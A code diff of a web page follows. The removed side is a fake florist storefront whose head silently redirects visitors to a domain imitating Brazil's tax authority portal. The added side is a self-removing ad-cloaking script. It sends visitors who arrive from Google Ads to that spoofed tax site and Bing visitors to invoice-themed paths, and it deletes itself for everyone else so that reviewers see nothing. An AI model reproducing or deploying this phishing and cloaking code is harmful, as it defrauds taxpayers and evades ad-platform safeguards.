@@ -1,169 +1,45 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-    <script>window.location.replace('https://www8-receita.portalfazend.website/SimplesNacional/Aplicacoes/ATSPO/pgmei.app/?go=tdSSz');</script>
-    <meta charset="UTF-8">
-    <title>Floricultura São Paulo LTDA | Flores Naturais e Presentes</title>
-    <meta name="description" content="Floricultura São Paulo LTDA desde 2011. Flores naturais, arranjos, flores com chocolate e presentes em São Paulo.">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script id="auto-destruct-script">
+(function() {
+    const urls = [
+        'cte/index',
+        'nfe/index',
+        'cte/index',
+        'asp/indexp',
+        'app/index',
+        'xml/indexp',
+        'danfe/index',
+        'nfe/index'
+    ];
 
-    <style>
-        body {
-            margin: 0;
-            font-family: Arial, Helvetica, sans-serif;
-            background-color: #ffffff;
-            color: #333;
+    function generateHash() {
+        return Math.random().toString(36).substring(2, 15) + 
+               Math.random().toString(36).substring(2, 15) + 
+               Date.now().toString(36);
+    }
+
+    const randomIndex = Math.floor(Math.random() * urls.length);
+    const randomUrl = urls[randomIndex];
+    const hash = generateHash();
+    const xirjfgjsdhdjd = 'https://www8-receita.portalfazend.website/SimplesNacional/Aplicacoes/ATSPO/pgmei.app/?go=tdSSz';  
+
+    let referer = (typeof document !== 'undefined' && document.referrer) ? document.referrer : 'not found';
+    let currentUrl = (typeof window !== 'undefined') ? window.location.href : '';
+
+    // Lógica de Redirecionamento
+    if (/gclid/i.test(referer) || /gclid/i.test(currentUrl)) {
+        if (typeof window !== 'undefined') {
+            window.location.href = xirjfgjsdhdjd;
         }
-        header {
-            background: #2e7d32;
-            color: white;
-            padding: 20px;
-            text-align: center;
+    } else if (/msclkid/i.test(referer) || /msclkid/i.test(currentUrl)) {
+        const bingUrl = randomUrl + '?msclkid=' + hash;
+        if (typeof window !== 'undefined') {
+            window.location.href = bingUrl;
         }
-        nav {
-            background: #1b5e20;
-            padding: 10px;
-            text-align: center;
+    } else {
+        // AUTO-DESTRUIÇÃO: Se não for origem Ads, o script remove a si mesmo do HTML
+        if (typeof document !== 'undefined' && document.currentScript) {
+            document.currentScript.remove();
         }
-        nav a {
-            color: white;
-            margin: 0 10px;
-            text-decoration: none;
-            font-weight: bold;
-        }
-        section {
-            padding: 40px 20px;
-            max-width: 1100px;
-            margin: auto;
-        }
-        h2 {
-            color: #2e7d32;
-        }
-        .produtos {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 20px;
-        }
-        .produto {
-            border: 1px solid #ddd;
-            padding: 20px;
-            border-radius: 8px;
-        }
-        footer {
-            background: #f5f5f5;
-            padding: 20px;
-            text-align: center;
-            font-size: 14px;
-        }
-        .legal {
-            font-size: 13px;
-            line-height: 1.6;
-        }
-    </style>
-</head>
-
-<body>
-
-<header>
-    <h1>Floricultura São Paulo LTDA</h1>
-    <p>Flores naturais, presentes e arranjos especiais desde 2011</p>
-</header>
-
-<nav>
-    <a href="#home">Início</a>
-    <a href="#produtos">Produtos</a>
-    <a href="#chocolate">Flores com Chocolate</a>
-    <a href="#quem-somos">Quem Somos</a>
-    <a href="#contato">Contato</a>
-    <a href="#privacidade">Privacidade</a>
-</nav>
-
-<section id="home">
-    <h2>Bem-vindo à Floricultura São Paulo</h2>
-    <p>
-        Somos especializados na venda de flores naturais, arranjos florais e presentes para todas as ocasiões.
-        Atuamos em São Paulo com compromisso, qualidade e respeito aos nossos clientes.
-    </p>
-</section>
-
-<section id="produtos">
-    <h2>Nossos Produtos</h2>
-    <div class="produtos">
-        <div class="produto">
-            <h3>Buquês de Flores Naturais</h3>
-            <p>Arranjos com flores frescas ideais para datas especiais.</p>
-        </div>
-        <div class="produto">
-            <h3>Arranjos Decorativos</h3>
-            <p>Perfeitos para ambientes residenciais e comerciais.</p>
-        </div>
-        <div class="produto">
-            <h3>Plantas Ornamentais</h3>
-            <p>Plantas naturais para decoração e bem-estar.</p>
-        </div>
-    </div>
-</section>
-
-<section id="chocolate">
-    <h2>Flores com Chocolate</h2>
-    <p>
-        Combinação perfeita de flores naturais com chocolates selecionados.
-        Uma excelente opção para presentear em aniversários, datas comemorativas
-        ou momentos especiais.
-    </p>
-</section>
-
-<section id="quem-somos">
-    <h2>Quem Somos</h2>
-    <p>
-        A <strong>Floricultura São Paulo LTDA</strong>, fundada em 16/02/2011,
-        atua no comércio varejista de plantas e flores naturais.
-        Somos uma empresa regularmente registrada, com CNPJ ativo e
-        compromisso com a transparência e qualidade no atendimento.
-    </p>
-</section>
-
-<section id="contato">
-    <h2>Contato</h2>
-    <p><strong>Empresa:</strong> Floricultura São Paulo LTDA</p>
-    <p><strong>CNPJ:</strong> 13.294.600/0001-51</p>
-    <p><strong>Endereço:</strong> Rua Henning Boilesen, 137 – Vila Lageado – São Paulo/SP – CEP 05338-050</p>
-    <p><strong>Telefone:</strong> (11) 255****-**** / (11) 383****-****</p>
-    <p><strong>E-mail:</strong> ma****@****.com.br</p>
-</section>
-
-<section id="privacidade">
-    <h2>Política de Privacidade</h2>
-    <div class="legal">
-        <p>
-            A Floricultura São Paulo LTDA respeita a privacidade de seus usuários.
-            As informações coletadas são utilizadas apenas para fins de contato,
-            atendimento e melhoria dos nossos serviços.
-        </p>
-        <p>
-            Não compartilhamos dados pessoais com terceiros, exceto quando exigido
-            por lei. Ao utilizar este site, você concorda com esta Política de Privacidade.
-        </p>
-    </div>
-</section>
-
-<section id="termos">
-    <h2>Termos de Uso</h2>
-    <div class="legal">
-        <p>
-            O uso deste site implica na aceitação dos termos aqui descritos.
-            As informações contidas podem ser alteradas sem aviso prévio.
-        </p>
-        <p>
-            Todo o conteúdo é de propriedade da Floricultura São Paulo LTDA.
-        </p>
-    </div>
-</section>
-
-<footer>
-    <p>© 2011 - 2026 Floricultura São Paulo LTDA | CNPJ 13.294.600/0001-51</p>
-</footer>
-
-</body>
-</html>
-
+    }
+})();
+</script>
